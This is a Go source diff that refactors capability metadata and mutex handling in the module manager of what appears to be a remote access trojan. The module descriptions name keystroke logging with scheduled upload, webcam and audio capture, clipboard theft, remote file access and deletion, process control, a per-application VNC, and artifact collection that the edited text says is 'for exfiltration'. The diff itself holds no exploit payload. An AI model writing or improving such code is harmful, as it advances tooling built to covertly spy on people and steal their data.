@@ -101,6 +101,7 @@ func envList(name string) []string {
 }
 
 type ModuleCapability struct {
+	ID          string
 	Name        string
 	Description string
 }
@@ -287,11 +288,12 @@ func (r *moduleManager) register(m Module) {
 
 func (r *moduleManager) Init(ctx context.Context, cfg Config) error {
 	r.mu.Lock()
-	defer r.mu.Unlock()
-
 	cfg.Extensions = r
+	entries := append([]*moduleEntry(nil), r.lifecycle...)
+	r.mu.Unlock()
+
 	var errs []error
-	for _, entry := range r.lifecycle {
+	for _, entry := range entries {
 		if err := entry.module.Init(ctx, cfg); err != nil {
 			label := entry.metadata.Title
 			if strings.TrimSpace(label) == "" {
@@ -306,11 +308,12 @@ func (r *moduleManager) Init(ctx context.Context, cfg Config) error {
 
 func (r *moduleManager) UpdateConfig(cfg Config) error {
 	r.mu.Lock()
-	defer r.mu.Unlock()
-
 	cfg.Extensions = r
+	entries := append([]*moduleEntry(nil), r.lifecycle...)
+	r.mu.Unlock()
+
 	var errs []error
-	for _, entry := range r.lifecycle {
+	for _, entry := range entries {
 		if err := entry.module.UpdateConfig(cfg); err != nil {
 			label := entry.metadata.Title
 			if strings.TrimSpace(label) == "" {
@@ -397,15 +400,38 @@ func sanitizeModuleCapabilities(caps []ModuleCapability) []ModuleCapability {
 		return nil
 	}
 	sanitized := make([]ModuleCapability, 0, len(caps))
+	seen := make(map[string]struct{})
 	for _, capability := range caps {
-		name := strings.TrimSpace(capability.Name)
-		if name == "" {
+		id := strings.TrimSpace(capability.ID)
+		if id == "" {
+			id = strings.TrimSpace(capability.Name)
+		}
+		if id == "" {
 			continue
 		}
+		key := strings.ToLower(id)
+		if _, duplicate := seen[key]; duplicate {
+			continue
+		}
+		if descriptor, ok := manifest.LookupCapability(id); ok {
+			sanitized = append(sanitized, ModuleCapability{
+				ID:          descriptor.ID,
+				Name:        descriptor.Name,
+				Description: descriptor.Description,
+			})
+			seen[key] = struct{}{}
+			continue
+		}
+		name := strings.TrimSpace(capability.Name)
+		if name == "" {
+			name = id
+		}
 		sanitized = append(sanitized, ModuleCapability{
+			ID:          id,
 			Name:        name,
 			Description: strings.TrimSpace(capability.Description),
 		})
+		seen[key] = struct{}{}
 	}
 	if len(sanitized) == 0 {
 		return nil
@@ -496,6 +522,7 @@ func (m *appVncModule) Metadata() ModuleMetadata {
 		Commands:    []string{"app-vnc"},
 		Capabilities: []ModuleCapability{
 			{
+				ID:          "app-vnc.launch",
 				Name:        "app-vnc.launch",
 				Description: "Clone per-application profiles and start virtualized sessions.",
 			},
@@ -619,12 +646,14 @@ func (m *remoteDesktopModule) Metadata() ModuleMetadata {
 		Commands:    []string{"remote-desktop"},
 		Capabilities: []ModuleCapability{
 			{
-				Name:        "remote-desktop.stream",
-				Description: "Stream high fidelity desktop frames to the controller UI.",
+				ID:          "remote-desktop.stream",
+				Name:        "Desktop streaming",
+				Description: "Stream high-fidelity desktop frames to the controller UI.",
 			},
 			{
-				Name:        "remote-desktop.input",
-				Description: "Relay keyboard and pointer input events back to the host.",
+				ID:          "remote-desktop.input",
+				Name:        "Input relay",
+				Description: "Relay keyboard and pointer events back to the remote host.",
 			},
 		},
 	}
@@ -904,13 +933,18 @@ func defaultRemoteDesktopEngineFactory(ctx context.Context, runtime Config, cfg 
 	version := strings.TrimSpace(result.Manifest.Version)
 	if runtime.Extensions != nil {
 		var caps []ModuleCapability
-		for _, capability := range result.Manifest.Capabilities {
-			if !strings.EqualFold(strings.TrimSpace(capability.Module), "remote-desktop") {
+		for _, capabilityID := range result.Manifest.Capabilities {
+			descriptor, ok := manifest.LookupCapability(capabilityID)
+			if !ok {
+				continue
+			}
+			if !strings.EqualFold(descriptor.Module, "remote-desktop") {
 				continue
 			}
 			caps = append(caps, ModuleCapability{
-				Name:        strings.TrimSpace(capability.Name),
-				Description: strings.TrimSpace(capability.Description),
+				ID:          descriptor.ID,
+				Name:        descriptor.Name,
+				Description: descriptor.Description,
 			})
 		}
 		if len(caps) > 0 {
@@ -948,10 +982,12 @@ func (m *webcamModule) Metadata() ModuleMetadata {
 		Commands:    []string{"webcam-control"},
 		Capabilities: []ModuleCapability{
 			{
+				ID:          "webcam.enumerate",
 				Name:        "webcam.enumerate",
 				Description: "Enumerate connected webcam devices and capabilities.",
 			},
 			{
+				ID:          "webcam.stream",
 				Name:        "webcam.stream",
 				Description: "Initiate webcam streaming sessions when supported.",
 			},
@@ -1012,12 +1048,14 @@ func (m *audioModule) Metadata() ModuleMetadata {
 		Commands:    []string{"audio-control"},
 		Capabilities: []ModuleCapability{
 			{
-				Name:        "audio.capture",
-				Description: "Capture remote system audio for operator playback.",
+				ID:          "audio.capture",
+				Name:        "Audio capture",
+				Description: "Capture remote system audio for monitoring and recording.",
 			},
 			{
-				Name:        "audio.inject",
-				Description: "Inject operator supplied audio into the remote session.",
+				ID:          "audio.inject",
+				Name:        "Audio injection",
+				Description: "Inject operator-provided audio streams into the remote session.",
 			},
 		},
 	}
@@ -1079,10 +1117,12 @@ func (m *keyloggerModule) Metadata() ModuleMetadata {
 		Commands:    []string{"keylogger.start", "keylogger.stop"},
 		Capabilities: []ModuleCapability{
 			{
+				ID:          "keylogger.stream",
 				Name:        "keylogger.stream",
 				Description: "Stream keystroke telemetry to the controller in near real time.",
 			},
 			{
+				ID:          "keylogger.batch",
 				Name:        "keylogger.batch",
 				Description: "Batch keystrokes offline and upload on a schedule.",
 			},
@@ -1150,12 +1190,14 @@ func (m *clipboardModule) Metadata() ModuleMetadata {
 		Commands:    []string{"clipboard"},
 		Capabilities: []ModuleCapability{
 			{
-				Name:        "clipboard.capture",
-				Description: "Capture clipboard updates emitted by the remote workstation.",
+				ID:          "clipboard.capture",
+				Name:        "Clipboard capture",
+				Description: "Capture clipboard changes emitted by the remote workstation.",
 			},
 			{
-				Name:        "clipboard.push",
-				Description: "Push operator provided clipboard payloads to the remote host.",
+				ID:          "clipboard.push",
+				Name:        "Clipboard push",
+				Description: "Push operator clipboard payloads to the remote host.",
 			},
 		},
 	}
@@ -1221,10 +1263,12 @@ func (m *fileManagerModule) Metadata() ModuleMetadata {
 		Commands:    []string{"file-manager"},
 		Capabilities: []ModuleCapability{
 			{
+				ID:          "file-manager.explore",
 				Name:        "file-manager.explore",
 				Description: "Enumerate directories and retrieve file contents from the host.",
 			},
 			{
+				ID:          "file-manager.modify",
 				Name:        "file-manager.modify",
 				Description: "Create, update, move, and delete files and directories on demand.",
 			},
@@ -1290,10 +1334,12 @@ func (m *taskManagerModule) Metadata() ModuleMetadata {
 		Commands:    []string{"task-manager"},
 		Capabilities: []ModuleCapability{
 			{
+				ID:          "task-manager.list",
 				Name:        "task-manager.list",
 				Description: "Collect real-time process snapshots with metadata.",
 			},
 			{
+				ID:          "task-manager.control",
 				Name:        "task-manager.control",
 				Description: "Start and orchestrate process actions on demand.",
 			},
@@ -1351,10 +1397,12 @@ func (m *tcpConnectionsModule) Metadata() ModuleMetadata {
 		Commands:    []string{"tcp-connections"},
 		Capabilities: []ModuleCapability{
 			{
+				ID:          "tcp-connections.enumerate",
 				Name:        "tcp-connections.enumerate",
 				Description: "Collect real-time socket state with process attribution.",
 			},
 			{
+				ID:          "tcp-connections.control",
 				Name:        "tcp-connections.control",
 				Description: "Stage enforcement actions for suspicious remote peers.",
 			},
@@ -1420,12 +1468,14 @@ func (m *recoveryModule) Metadata() ModuleMetadata {
 		Commands:    []string{"recovery"},
 		Capabilities: []ModuleCapability{
 			{
-				Name:        "recovery.queue",
-				Description: "Queue recovery jobs for background execution.",
+				ID:          "recovery.queue",
+				Name:        "Recovery queue",
+				Description: "Queue recovery jobs for background execution and monitoring.",
 			},
 			{
-				Name:        "recovery.collect",
-				Description: "Collect files and artifacts staged by other modules.",
+				ID:          "recovery.collect",
+				Name:        "Artifact collection",
+				Description: "Collect artifacts staged by upstream modules for exfiltration.",
 			},
 		},
 	}
@@ -1491,12 +1541,14 @@ func (m *clientChatModule) Metadata() ModuleMetadata {
 		Commands:    []string{"client-chat"},
 		Capabilities: []ModuleCapability{
 			{
-				Name:        "client-chat.persist",
-				Description: "Respawn the client chat interface if the process terminates unexpectedly.",
+				ID:          "client-chat.persistent",
+				Name:        "Persistent window",
+				Description: "Keep the chat interface open continuously and respawn it if terminated.",
 			},
 			{
-				Name:        "client-chat.alias",
-				Description: "Apply controller-provided aliases for both participants in real time.",
+				ID:          "client-chat.alias",
+				Name:        "Alias control",
+				Description: "Allow the controller to update operator and client aliases in real time.",
 			},
 		},
 	}
@@ -1562,12 +1614,14 @@ func (m *systemInfoModule) Metadata() ModuleMetadata {
 		Commands:    []string{"system-info"},
 		Capabilities: []ModuleCapability{
 			{
-				Name:        "system-info.snapshot",
-				Description: "Provide a structured snapshot of operating system and hardware data.",
+				ID:          "system-info.snapshot",
+				Name:        "System snapshot",
+				Description: "Produce structured operating system and hardware inventories.",
 			},
 			{
-				Name:        "system-info.telemetry",
-				Description: "Report live telemetry metrics used by other modules for scheduling.",
+				ID:          "system-info.telemetry",
+				Name:        "System telemetry",
+				Description: "Surface live telemetry metrics used by scheduling and recovery modules.",
 			},
 		},
 	}
